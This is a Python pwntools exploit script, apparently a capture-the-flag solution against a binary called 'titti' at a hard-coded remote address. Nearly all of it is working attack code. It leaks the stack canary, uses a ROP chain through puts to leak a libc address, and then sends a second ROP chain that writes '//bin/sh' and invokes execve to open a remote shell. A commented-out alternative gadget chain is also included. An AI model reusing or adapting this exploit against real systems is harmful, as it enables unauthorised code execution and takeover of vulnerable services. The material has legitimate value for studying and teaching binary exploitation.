from struct import pack
from pwn import *
import sys

#########################################################
LIBC="libc-2.23_x64.so"
BINARY="./titti"
ENV={"LD_PRELOAD":LIBC}
GDB="break *main"
HOST="46.101.199.176"
PORT=9003
#########################################################

# context.terminal = "gnome-terminal"

r = process(BINARY, env=ENV)
r = remote(HOST, PORT)
# binary = ELF(BINARY)
libc_elf = ELF(LIBC)

# Wait for debugger
# pid = util.proc.pidof(r)[0]
# print("The pid is: "+str(pid))
# os.system("urxvt -e r2 -Ad "+str(pid)+" -c '' &")
# util.proc.wait_for_debugger(pid)


"""
0x0400779           : loop start
0x0400904          : string "Pepsi"
0x0601020          : puts location
0x04005C0          : jmp puts
0x0400726          : main
0x04008d2          : pop r15 ; ret
0x04008d3          : pop rdi ; ret
"""



r.sendline(("Beer"+"a"*0x24).encode()) # we overwrite the last bit of the canary (which is 0x00)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
canary = u64(bytes([0x00]) + r.recvline()[:7])

exploit = ("aaaa"+"a"*0x24).encode() + p64(canary) + p64(0xdaadbeef) # initial padding
exploit += p64(0x04008d3) + p64(0x0601020) + p64(0x04005C0) # pop rdi + argument + puts
exploit += p64(0x0400726)
exploit += p64(0x0400726)
exploit += p64(0x0400726)

r.sendline(exploit)

r.recvline()
r.recvline()
r.recvline()
r.recvline()

aaa = r.recvline()[:8]
puts_address = u64(aaa + bytes([0x00])) & 0x0000ffffffffffff

print (" >> puts addr: " + hex(puts_address))
libc_address = puts_address - libc_elf.symbols[b"_IO_puts"]
print (" >> libc addr: " + hex(libc_address))
rebase_0 = lambda x : p64(x + libc_address)


# rop = b''
# rop += rebase_0(0x0000000000020df4) # 0x0000000000020df4: pop r13; ret;
# rop += b'//bin/sh'
# rop += rebase_0(0x000000000002090f) # 0x000000000002090f: pop rdi; ret;
# rop += rebase_0(0x00000000003b1010)
# rop += rebase_0(0x0000000000054d29) # 0x0000000000054d29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
# rop += p64(0xdeadbeefdeadbeef)
# rop += p64(0xdeadbeefdeadbeef)
# rop += p64(0xdeadbeefdeadbeef)
# rop += p64(0xdeadbeefdeadbeef)
# rop += rebase_0(0x0000000000020df4) # 0x0000000000020df4: pop r13; ret;
# rop += p64(0x0000000000000000)
# rop += rebase_0(0x000000000002090f) # 0x000000000002090f: pop rdi; ret;
# rop += rebase_0(0x00000000003b2008)
# rop += rebase_0(0x0000000000054d29) # 0x0000000000054d29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
# rop += p64(0xdeadbeefdeadbeef)
# rop += p64(0xdeadbeefdeadbeef)
# rop += p64(0xdeadbeefdeadbeef)
# rop += p64(0xdeadbeefdeadbeef)
# rop += rebase_0(0x000000000002090f) # 0x000000000002090f: pop rdi; ret;
# rop += rebase_0(0x00000000003b1010)
# rop += rebase_0(0x00000000000212e2) # 0x00000000000212e2: pop rsi; ret;
# rop += rebase_0(0x00000000003b2008)
# rop += rebase_0(0x0000000000001b96) # 0x0000000000001b96: pop rdx; ret;
# rop += rebase_0(0x00000000003b2008)
# rop += rebase_0(0x0000000000037ae8) # 0x0000000000037ae8: pop rax; ret;
# rop += p64(0x000000000000003b)
# rop += rebase_0(0x00000000000b3755) # 0x00000000000b3755: syscall; ret;





rop = b''
rop += rebase_0(0x00000000000206c4) # 0x00000000000206c4: pop r13; ret;
rop += b'//bin/sh'
rop += rebase_0(0x0000000000021102) # 0x0000000000021102: pop rdi; ret;
rop += rebase_0(0x00000000003c4090)
rop += rebase_0(0x0000000000054d85) # 0x0000000000054d85: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000206c4) # 0x00000000000206c4: pop r13; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x0000000000021102) # 0x0000000000021102: pop rdi; ret;
rop += rebase_0(0x00000000003c5088)
rop += rebase_0(0x0000000000054d85) # 0x0000000000054d85: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000021102) # 0x0000000000021102: pop rdi; ret;
rop += rebase_0(0x00000000003c4090)
rop += rebase_0(0x00000000000202e8) # 0x00000000000202e8: pop rsi; ret;
rop += rebase_0(0x00000000003c5088)
rop += rebase_0(0x0000000000001b92) # 0x0000000000001b92: pop rdx; ret;
rop += rebase_0(0x00000000003c5088)
rop += rebase_0(0x0000000000033544) # 0x0000000000033544: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x00000000000bc375) # 0x00000000000bc375: syscall; ret;



r.sendline(("Beer"+"a"*0x24).encode()) # we overwrite the last bit of the canary (which is 0x00)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
canary = u64(bytes([0x00]) + r.recvline()[:7])

exploit = ("aaaa"+"a"*0x24).encode() + p64(canary) + p64(0xdaadbeef) # initial padding
exploit += rop
exploit += p64(0x0400726)

r.sendline(exploit)

r.interactive()
